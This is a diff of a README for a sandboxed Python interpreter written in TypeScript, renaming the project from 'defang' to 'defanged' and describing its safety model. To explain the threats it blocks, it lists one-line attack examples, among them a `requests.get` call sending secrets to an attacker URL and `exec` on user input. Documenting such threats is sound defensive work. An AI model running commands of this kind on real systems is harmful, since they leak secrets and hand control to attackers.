@@ -1,8 +1,8 @@
 <p align="center">
-  <img src="logo.png" alt="defang logo" width="600" />
+  <img src="logo.png" alt="defanged logo" width="600" />
 </p>
 
-# defang
+# defanged
 
 **A sandboxed Python interpreter written in TypeScript.** Safely run Python code emitted by LLMs and agents — no filesystem access, no network access, no escape to the host process, and inject your own functions.
 
@@ -13,7 +13,7 @@
 
 ---
 
-## Why defang?
+## Why defanged?
 
 LLMs love writing Python. It's the lingua franca of data work, scripting, and most agent toolchains. But handing an agent a real Python runtime is a liability:
 
@@ -22,7 +22,7 @@ LLMs love writing Python. It's the lingua franca of data work, scripting, and mo
 - `import requests; requests.get(attacker_url, data=secrets)` — data exfiltration
 - `exec(user_input)` — arbitrary code execution
 
-`defang` executes Python without any of this. There is no module system, no filesystem, no network, no `exec`/`eval`, no `subprocess` — because **none of those exist in the interpreter**. You cannot disable a feature that was never implemented.
+`defanged` executes Python without any of this. There is no module system, no filesystem, no network, no `exec`/`eval`, no `subprocess` — because **none of those exist in the interpreter**. You cannot disable a feature that was never implemented.
 
 The only I/O channel is **tools you explicitly inject from TypeScript**. If you don't provide a tool, the Python code cannot call it.
 
@@ -31,15 +31,15 @@ The only I/O channel is **tools you explicitly inject from TypeScript**. If you 
 ## Install
 
 ```bash
-npm install defang
+npm install defanged
 # or
-bun add defang
+bun add defanged
 ```
 
 ## Quick start
 
 ```typescript
-import { runPython } from "defang";
+import { runPython } from "defanged";
 
 const result = await runPython(`
 total = sum([x * 2 for x in range(10) if x % 2 == 0])
@@ -54,7 +54,7 @@ console.log(result); // "Total: 40"
 Tools are the only way Python code can reach data outside the interpreter:
 
 ```typescript
-import { runPython } from "defang";
+import { runPython } from "defanged";
 
 const result = await runPython(
   `
@@ -79,7 +79,7 @@ Handlers can be synchronous or async. The interpreter awaits async handlers auto
 ### Reusable interpreter
 
 ```typescript
-import { createInterpreter } from "defang";
+import { createInterpreter } from "defanged";
 
 const interpreter = createInterpreter({
   tools: [...],
@@ -113,13 +113,13 @@ A quick overview — see [`FEATURES.md`](./FEATURES.md) for the authoritative li
 | `async` / `await` | **Not applicable.** The sandbox has no I/O to await. Concurrency is not meaningful in a single-threaded, network-free interpreter. |
 | `input()` | **Not applicable.** There is no interactive stdin. Data should be passed in via tools. |
 | `str.encode()` / `bytes` type | **Not useful for agents.** Binary data handling is irrelevant in a text-processing sandbox. |
-| Default mutable argument sharing | **Intentional deviation.** In CPython, `def f(x=[]):` shares the list across calls — a well-known footgun. defang creates a fresh default each call, which is safer for sandboxed use. |
+| Default mutable argument sharing | **Intentional deviation.** In CPython, `def f(x=[]):` shares the list across calls — a well-known footgun. defanged creates a fresh default each call, which is safer for sandboxed use. |
 
 ---
 
 ## Safety model
 
-`defang` is safe by _construction_, not by _configuration_. The dangerous Python features simply do not exist in this interpreter — there is no flag to enable them and no module to import them from.
+`defanged` is safe by _construction_, not by _configuration_. The dangerous Python features simply do not exist in this interpreter — there is no flag to enable them and no module to import them from.
 
 | Attack surface         | Status                                                   |
 | ---------------------- | -------------------------------------------------------- |
@@ -136,7 +136,7 @@ A quick overview — see [`FEATURES.md`](./FEATURES.md) for the authoritative li
 ### Residual risks (yours to own)
 
 1. **Tool handlers are trust boundaries.** Whatever a tool handler does with its arguments is on you. If a tool runs SQL, parameterize it. If a tool calls out to a system, validate inputs.
-2. **Memory.** `[0] * 10_000_000` is legal Python and `defang` will happily allocate it. Put a memory budget on your Node/Bun process if you're running untrusted input.
+2. **Memory.** `[0] * 10_000_000` is legal Python and `defanged` will happily allocate it. Put a memory budget on your Node/Bun process if you're running untrusted input.
 3. **Wall-clock.** Iteration-counting prevents infinite loops but does not cap wall-clock time. Run untrusted code in a worker with a timeout.
 
 ---
@@ -212,15 +212,15 @@ A substantial portion of this codebase was written with the help of Claude. I'm 
 
 **A Python interpreter is a black box with a very well-defined contract.** The contract is "behave like CPython for the supported subset." That contract is:
 
-- **Externally specified.** Python's semantics are documented, tested, and can be verified against a reference implementation that ships with every major OS. If `defang` says `int(-3.9) == -3`, I can check that in a real Python REPL in five seconds.
+- **Externally specified.** Python's semantics are documented, tested, and can be verified against a reference implementation that ships with every major OS. If `defanged` says `int(-3.9) == -3`, I can check that in a real Python REPL in five seconds.
 - **Mechanically testable.** Every behavioral claim is a unit test. Given input X, produce output Y. There is very little room for "it works but it's subtly wrong" in a way that tests wouldn't catch — and when there is, the right fix is to add a test, not to re-audit the code by hand.
 - **Narrowly scoped.** The code does one thing: interpret a stream of Python tokens and produce values. It does not make network calls, write to disk, or interact with shared state. The blast radius of a bug is "the code returns the wrong answer," not "the code leaks user data."
 
 For projects like this — interpreters, parsers, codecs, protocol implementations, math libraries, anything with a reference spec and deterministic I/O — I believe the honest engineering question is not "who typed this?" but "is the behavior correct, and can you prove it?" The test suite is the proof. If `bun test` passes and the coverage is honest, the implementation is sound whether a human, an AI, or a team of both produced it.
 
-I would not make the same argument about a project where the spec _is_ the code itself — a novel system design, a security-critical protocol, a piece of infrastructure where the blast radius extends beyond its return value. Those warrant human review line by line. `defang` is not that project.
+I would not make the same argument about a project where the spec _is_ the code itself — a novel system design, a security-critical protocol, a piece of infrastructure where the blast radius extends beyond its return value. Those warrant human review line by line. `defanged` is not that project.
 
-If you find a case where `defang` diverges from CPython, please [file an issue](https://github.com/ianjaku/defang/issues) with a minimal repro. That's the contract.
+If you find a case where `defanged` diverges from CPython, please [file an issue](https://github.com/ianjaku/defanged/issues) with a minimal repro. That's the contract.
 
 ---
 
